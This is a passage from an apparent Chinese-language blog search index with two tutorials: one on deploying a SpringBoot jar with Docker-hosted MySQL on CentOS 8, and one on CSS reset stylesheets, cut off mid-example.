class="line">#安装 Docker Engine-Community</span><br><span class="line">sudo yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line"># -----分割线</span><br><span class="line">sudo yum-config-manager \</span><br><span class="line">  --add-repo \</span><br><span class="line">  http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"># -----分割线</span><br><span class="line">sudo yum install docker-ce docker-ce-cli containerd.io</span><br><span class="line"># ----分割线</span><br><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure><blockquote><p>如果安装发生错误那么你需要执行一下命令</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">yum install https://download.docker.com/linux/fedora/30/x86_64/stable/Packages/containerd.io-1.2.6-3.3.fc30.x86_64.rpm</span><br></pre></td></tr></table></figure><blockquote><p>下面我们进行MySQL的安装</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看可用的 MySQL 版本</span><br><span class="line">docker search mysql</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#拉取8.0.22版本，这里推荐安装和自己项目一致的版本</span><br><span class="line">docker pull mysql:8.0.22</span><br></pre></td></tr></table></figure><blockquote><p>下面我们要对MySQL进行配置</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建配置文件目录</span><br><span class="line">mkdir -p /data/docker/mysql/conf</span><br><span class="line">#进入配置文件目录，添加一个配置文件</span><br><span class="line">vim my.cnf</span><br></pre></td></tr></table></figure><blockquote><p>配置文件内容</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">character-set-server=utf8</span><br><span class="line"></span><br><span class="line">[mysql]</span><br><span class="line">default-character-set=utf8</span><br></pre></td></tr></table></figure><blockquote><p>完成配置后我们需要启动镜像 (注意记住自己设置的密码)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#启动镜像</span><br><span class="line">docker run -p 3306:3306 --name mysql -v /data/docker/mysql/conf:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=123456 -d mysql:8.0.22</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#进入docker容器设置env LANG=C.UTF-8</span><br><span class="line">docker exec -it mysql env LANG=C.UTF-8 bash</span><br></pre></td></tr></table></figure><hr><h3 id="项目部署"><a href="#项目部署" class="headerlink" title="项目部署"></a>项目部署</h3><ul><li>首先我们需要将项目打包（jar包）</li><li>然后我们要设置好MySQL数据表</li><li>然后我们进行服务器部署，首先我们需要查看需要的端口有没有被占用(建议不要使用8080端口)</li></ul><hr><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -anp | grep 8080 </span><br></pre></td></tr></table></figure><blockquote><p>如果端口被占用了，我们需要获取到它PID值</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo lsof -i:8800 </span><br></pre></td></tr></table></figure><blockquote><p>拿到PID值后，我们需要将它Kill掉，留出空位来运行我们的项目</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo kill -9 11356</span><br></pre></td></tr></table></figure><blockquote><p>最后我们执行代码启动项目（断开连接自动停止），***为你的jar包名</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ***.jar</span><br></pre></td></tr></table></figure><blockquote><p>没有问题后我们执行持久运行</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nohup java -jar  ***.jar &amp;</span><br></pre></td></tr></table></figure><blockquote><p>在后端查看日志</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tail -f nohup.out</span><br></pre></td></tr></table></figure><hr><p><strong>至此，CentOs 8.0部署SpringBoot项目已经介绍完成了，当然如果还有疑问或者需要我的素材包请联系我</strong></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 教学文档 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Css初始化Readme文件</title>
      <link href="/2021/09/06/WEB_Css_readme/"/>
      <url>/2021/09/06/WEB_Css_readme/</url>
      
        <content type="html"><![CDATA[<h2 id="Css初始化Readme文件"><a href="#Css初始化Readme文件" class="headerlink" title="Css初始化Readme文件"></a>Css初始化Readme文件</h2><p>以下提供两种方法，请选择合适自己的，<strong>且根据项目实际需求自行修改</strong></p><hr><h3 id="方法一：引用Github中necolas的浏览器初始化"><a href="#方法一：引用Github中necolas的浏览器初始化" class="headerlink" title="方法一：引用Github中necolas的浏览器初始化"></a>方法一：引用Github中necolas的浏览器初始化</h3><p><strong>该方法的目的为</strong>：消除不同浏览器对HTML文本呈现的差异.</p><p>代码演示</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Document</span></span><br><span class="line"><span class="comment">   ========================================================================== */</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1. Correct the line height in all browsers.</span></span><br><span class="line"><span class="comment"> * 2. Prevent adjustments of font size after orientation changes in iOS.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">html</span> &#123;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1.15</span>; <span class="comment">/* 1 */</span></span><br><span class="line">  -webkit-text-size-adjust: <span class="number">100%</span>; <span class="comment">/* 2 */</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Sections</span></span><br><span class="line"><span class="comment">   ========================================================================== */</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Remove the margin in all browsers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Render the `main` element consistently in IE.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">main</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Correct the font size and margin on `h1` elements within `section` and</span></span><br><span class="line"><span class="comment"> * `article` contexts in Chrome, Firefox, and Safari.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">h1</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">2em</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0.67em</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Grouping content</span></span><br><span class="line"><span class="comment">   ========================================================================== */</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1. Add the correct box sizing in Firefox.</span></span><br><span class="line"><span class="comment"> * 2. Show the overflow in Edge and IE.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line">hr &#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>: content-box; <span class="comment">/* 1 */</span></span><br><span class="line">  <span class="attribute">height</span>: <span class="number">0</span>; <span class="comment">/* 1 */</span></span><br><span class="line">  <span class="attribute">overflow</span>: visible; <span class="comment">/* 2 */</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1. Correct the inheritance and scaling of font size in all browsers.</span></span><br><span class="line"><span class="comment"> * 2. Correct the odd `em` font sizing in all browsers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line">pre &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: monospace, monospace; <span class="comment">/* 1 */</span></span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1em</span>; <span class="comment">/* 2 */</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Text-level semantics</span></span><br><span class="line"><span class="comment">   ========================================================================== */</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Remove the gray background on active links in IE 10.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: transparent;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1. Remove the bottom border in Chrome 57-</span></span><br><span class="line"><span class="comment"> * 2. Add the correct text decoration in Chrome, Edge, IE, Opera, and Safari.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">abbr</span><span class="selector-attr">[title]</span> &#123;</span><br><span class="line">  <span class="attribute">border-bottom</span>: none; <span class="comment">/* 1 */</span></span><br><span class="line">  <span class="attribute">text-decoration</span>: underline; <span class="comment">/* 2 */</span></span><br><span class="line">  <span class="attribute">text-decoration</span>: underline dotted; <span class="comment">/* 2 */</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Add the correct font weight in Chrome, Edge, and Safari.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">b</span>,</span><br><span class="line"><span class="selector-tag">strong</span> &#123;</span><br><span class="line">  <span class="attribute">font-weight</span>: bolder;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1. Correct the inheritance and scaling of font size in all browsers.</span></span><br><span class="line"><span class="comment"> * 2. Correct the odd `em` font sizing in all browsers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">code</span>,</span><br><span class="line"><span class="selector-tag">kbd</span>,</span><br><span class="line"><span class="selector-tag">samp</span> &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: monospace, monospace; <span class="comment">/* 1 */</span></span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1em</span>; <span class="comment">/* 2 */</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Add the correct font size in all browsers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line">small &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">80%</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Prevent `sub` and `sup` elements from affecting the line height in</span></span><br><span class="line"><span class="comment"> * all browsers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line">sub,</span><br><span class="line"><span class="selector-tag">sup</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">75%</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">vertical-align</span>: baseline;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">sub &#123;</span><br><span class="line">  <span class="attribute">bottom</span>: -<span class="number">0.25em</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">sup</span> &#123;</span><br><span class="line">  <span class="attribute">top</span>: -<span class="number">0.5em</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Embedded content</span></span><br><span class="line"><span class="comment">   ========================================================================== */</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Remove the border on images inside links in IE 10.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">img</span> &#123;</span><br><span class="line">  <span class="attribute">border-style</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Forms</span></span><br><span class="line"><span class="comment">   ========================================================================== */</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1. Change the font styles in all browsers.</span></span><br><span class="line"><span class="comment"> * 2. Remove the margin in Firefox and Safari.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">button</span>,</span><br><span class="line"><span class="selector-tag">input</span>,</span><br><span class="line">optgroup,</span><br><span class="line">select,</span><br><span class="line"><span class="selector-tag">textarea</span> &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: inherit; <span class="comment">/* 1 */</span></span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">100%</span>; <span class="comment">/* 1 */</span></span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1.15</span>; <span class="comment">/* 1 */</span></span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>; <span class="comment">/* 2 */</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Show the overflow in IE.</span></span><br><span class="line"><span class="comment"> * 1. Show the overflow in Edge.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">button</span>,</span><br><span class="line"><span class="selector-tag">input</span> &#123; <span class="comment">/* 1 */</span></span><br><span class="line">  <span class="attribute">overflow</span>: visible;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Remove the inheritance of text transform in Edge, Firefox, and IE.</span></span><br><span class="line"><span class="comment"> * 1. Remove the inheritance of text transform in Firefox.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">button</span>,</span><br><span class="line">select &#123; <span class="comment">/* 1 */</span></span><br><span class="line">  <span class="attribute">text-transform</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Correct the inability to style clickable types in iOS and Safari.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">button</span>,</span><br><span class="line"><span class="selector-attr">[type=<span class="string">&quot;button&quot;</span>]</span>,</span><br><span class="line"><span class="selector-attr">[type=<span class="string">&quot;reset&quot;</span>]</span>,</span><br><span class="line"><span class="selector-attr">[type=<span class="string">&quot;submit&quot;</span>]</span> &#123;</span><br><span class="line">  -webkit-appearance: button;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Remove the inner border and padding in Firefox.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">button</span>::-moz-focus-inner,</span><br><span class="line">[type=<span class="string">&quot;button&quot;</span>]::-moz-focus-inner,</span><br><span class="line">[type=<span class="string">&quot;reset&quot;</span>]::-moz-focus-inner,</span><br><span class="line">[type=<span class="string">&quot;submit&quot;</span>]::-moz-focus-inner &#123;</span><br><span class="line">  border-style: none;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Restore the focus styles unset by the previous rule.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">button</span>:-moz-focusring,</span><br><span class="line">[type=<span class="string">&quot;button&quot;</span>]:-moz-focusring,</span><br><span class="line">[type=<span class="string">&quot;reset&quot;</span>]:-moz-focusring,</span><br><span class="line">[type=<span class="string">&quot;submit&quot;</span>]:-moz-focusring &#123;</span><br><span class="line">  outline: <span class="number">1px</span> dotted ButtonText;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Correct the padding in Firefox.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">fieldset</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0.35em</span> <span class="number">0.75em</span> <span class="number">0.625em</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1. Correct the text wrapping in Edge and IE.</span></span><br><span class="line"><span class="comment"> * 2. Correct the color inheritance from `fieldset` elements in IE.</span></span><br><span class="line"><span class="comment"> * 3. Remove the padding so developers are not caught out when they zero out</span></span><br><span class="line"><span class="comment"> *    `fieldset` elements in all browsers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">legend</span> &#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box; <span class="comment">/* 1 */</span></span><br><span class="line">  <span class="attribute">color</span>: inherit; <span class="comment">/* 2 */</span></span><br><span class="line">  <span class="attribute">display</span>: table; <span class="comment">/* 1 */</span></span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">100%</span>; <span class="comment">/* 1 */</span></span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>; <span class="comment">/* 3 */</span></span><br><span class="line">  <span class="attribute">white-space</span>: normal; <span class="comment">/* 1 */</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Add the correct vertical alignment in Chrome, Firefox, and Opera.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line">progress &#123;</span><br><span class="line">  <span class="attribute">vertical-align</span>: baseline;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Remove the default vertical scrollbar in IE 10+.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">textarea</span> &#123;</span><br><span class="line">  <span class="attribute">overflow</span>: auto;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1. Add the correct box sizing in IE 10.</span></span><br><span class="line"><span class="comment"> * 2. Remove the padding in IE 10.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-attr">[type=<span class="string">&quot;checkbox&quot;</span>]</span>,</span><br><span class="line"><span class="selector-attr">[type=<span class="string">&quot;radio&quot;</span>]</span> &#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box; <span class="comment">/* 1 */</span></span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>; <span class="comment">/* 2 */</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Correct the cursor style of increment and decrement buttons in Chrome.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-attr">[type=<span class="string">&quot;number&quot;</span>]</span>::-webkit-inner-spin-button,</span><br><span class="line">[type=<span class="string">&quot;number&quot;</span>]::-webkit-outer-spin-button &#123;</span><br><span class="line">  height: auto;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1. Correct the odd appearance in Chrome and Safari.</span></span><br><span class="line"><span class="comment"> * 2. Correct the outline style in Safari.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-attr">[type=<span class="string">&quot;search&quot;</span>]</span> &#123;</span><br><span class="line">  -webkit-appearance: textfield; <span class="comment">/* 1 */</span></span><br><span class="line">  <span class="attribute">outline-offset</span>: -<span class="number">2px</span>; <span class="comment">/* 2 */</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Remove the inner padding in Chrome and Safari on macOS.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-attr">[type=<span class="string">&quot;search&quot;</span>]</span>::-webkit-search-decoration &#123;</span><br><span class="line">  -webkit-appearance: none;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1. Correct the inability to style clickable types in iOS and Safari.</span></span><br><span class="line"><span class="comment"> * 2. Change font properties to `inherit` in Safari.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line">::-webkit-file-upload-button &#123;</span><br><span class="line">  -webkit-appearance: button; <span class="comment">/* 1 */</span></span><br><span class="line">  <span class="attribute">font</span>: inherit; <span class="comment">/* 2 */</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Interactive</span></span><br><span class="line"><span class="comment">   ========================================================================== */</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Add the correct display in Edge, IE 10+, and Firefox.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">details</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Add the correct display in all browsers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">summary</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: list-item;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Misc</span></span><br><span class="line"><span class="comment">   ========================================================================== */</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Add the correct display in IE 10+.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line">template &#123;</span><br><span class="line">  <span class="attribute">display</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Add the correct display in IE 10.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="selector-attr">[hidden]</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="方式二：常用标签的初始化"><a href="#方式二：常用标签的初始化" class="headerlink" title="方式二：常用标签的初始化"></a>方式二：常用标签的初始化</h3><p><strong>该方法的目的为</strong>：一般标签在浏览器中都有默认样式，例如body标签有默认的外边距，ul有默认的小黑点和内边距，前端程序员在写页面的时候会把这些默认的样式都清除掉，让所有标签的外观效果在所有浏览器表现一致，这个步骤就是css的初始化。</p><p>代码演示</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">HTML</span>, <span class="selector-tag">body</span>, <span class="selector-tag">div</span>, <span class="selector-tag">h1</span>, <span class="selector-tag">h2</span>, <span class="selector-tag">h3</span>, <span class="selector-tag">h4</span>, <span class="selector-tag">h5</span>, <span class="selector-tag">h6</span>, <span class="selector-tag">ul</span>, <span class="selector-tag">ol</span>, <span class="selector-tag">dl</span>, <span class="selector-tag">li</span>, <span class="selector-tag">dt</span>, <span class="selector-tag">dd</span>, <span class="selector-tag">p</span>, <span class="selector-tag">blockquote</span>,</span><br><span class="line">pre, <span class="selector-tag">form</span>, <span class="selector-tag">fieldset</span>, <span class="selector-tag">table</span>, <span class="selector-tag">th</span>, <span class="selector-tag">td</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>:none;</span><br><span class="line">    <span class="attribute">font-family</span>:<span class="string">&quot;微软雅黑&quot;</span>,<span class="string">&quot;黑体&quot;</span>,<span class="string">&quot;宋体&quot;</span>;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">14px</span>;</span><br><span class="line">    <span class="attribute">margin</span>:<span class="number">0px</span>;</span><br><span class="line">    <span class="attribute">padding</span>:<span class="number">0px</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="selector-tag">html</span>,<span class="selector-tag">body</span>&#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="selector-tag">address</span>, <span class="selector-tag">caption</span>, <span class="selector-tag">cite</span>, <span class="selector-tag">code</span>, <span class="selector-tag">dfn</span>, <span class="selector-tag">em</span>, <span class="selector-tag">strong</span>, <span class="selector-tag">th</span>, <span class="selector-tag">var</span> &#123;</span><br><span class="line">    <span class="attribute">font-style</span>: normal;</span><br><span class="line">    <span class="attribute">font-weight</span>: normal;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">a</span>&#123;</span><br><span class="line">    <span class="attribute">text-decoration</span>:none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:link</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>:<span class="number">#fff</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:visited</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>:<span class="number">#fff</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>:<span class="number">#fff</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:active</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>:<span class="number">#fff</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span>::-ms-clear&#123;</span><br><span class="line">    display:none;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="selector-tag">input</span>::-ms-reveal&#123;</span><br><span class="line">    display:none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span>&#123;</span><br><span class="line">    -webkit-appearance: none;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">outline</span>: none;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span>::-webkit-input-placeholder&#123;</span><br><span class="line">    color: <span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span>::-ms-input-placeholder&#123;</span><br><span class="line">    color: <span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span>::-moz-placeholder&#123;</span><br><span class="line">    color: <span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[type=submit]</span>,<span class="selector-tag">input</span><span class="selector-attr">[type=button]</span>&#123;</span><br><span class="line">    <span class="attribute">cursor</span>: pointer;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">button</span><span class="selector-attr">[disabled]</span>, <span class="selector-tag">input</span><span class="selector-attr">[disabled]</span> &#123;</span><br><span class="line">    <span class="attribute">cursor</span>: default;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">img</span>&#123;</span><br><span class="line">    <span class="attribute">border</span>:none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">ul</span>,<span class="selector-tag">ol</span>,<span class="selector-tag">li</span>&#123;</span><br><span class="line">    <span class="attribute">list-style-type</span>:none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*公共方法*/</span></span><br><span class="line"><span class="selector-class">.clear</span>&#123;</span><br><span class="line">    <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.clearleft</span>&#123;</span><br><span class="line">    <span class="attribute">clear</span>: left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.clearright</span>&#123;</span><br><span class="line">    <span class="attribute">clear</span>: right;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.floatleft</span>&#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.floatright</span>&#123;</span><br><span class="line">    <span class="attribute">float</span>: right;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.cursor</span>&#123;</span><br><span class="line">    <span class="attribute">cursor</span>: pointer;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*背景及色值表*/</span></span><br><span class="line"><span class="selector-class">.bg000</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.color000</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调用实现"><a href="#调用实现" class="headerlink" title="调用实现"></a>调用实现</h3><p>在项目HTML头文件中声明该文件的地址，<strong>注意路径是否正确</strong></p><p>调用代码演示</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span 